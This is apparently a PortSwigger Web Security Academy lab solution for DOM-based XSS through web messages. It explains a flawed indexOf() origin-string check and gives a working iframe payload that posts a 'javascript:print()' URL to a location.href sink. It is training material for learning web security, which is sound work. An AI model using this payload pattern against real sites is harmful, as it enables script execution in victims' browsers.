## DOM XSS using web messages and a JavaScript URL

**Category:** xss_dom
**Difficulty:** Unknown

### Description
This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls theprint()function.

### Solution Steps
1. Notice that the home page contains an addEventListener() call that listens for a web message. The JavaScript contains a flawed indexOf() check that looks for the strings "http:" or "https:" anywhere within the web message. It also contains the sink location.href .
2. Go to the exploit server and add the following iframe to the body, remembering to replace YOUR-LAB-ID with your lab ID: <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
3. Store the exploit and deliver it to the victim.

### Key Payloads
- `print()`
- `addEventListener()`
- `indexOf()`
- `"http:"`
- `"https:"`
- `location.href`
- `iframe`
- `YOUR-LAB-ID`
- `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">`
- `targetOrigin`

### Indicators of Success
- DOM sink receives tainted source data
- JavaScript executes via DOM manipulation
- URL fragment or hash value exploited
- postMessage handler vulnerable
- Client-side code processes attacker input
---
*Source: PortSwigger Web Security Academy*
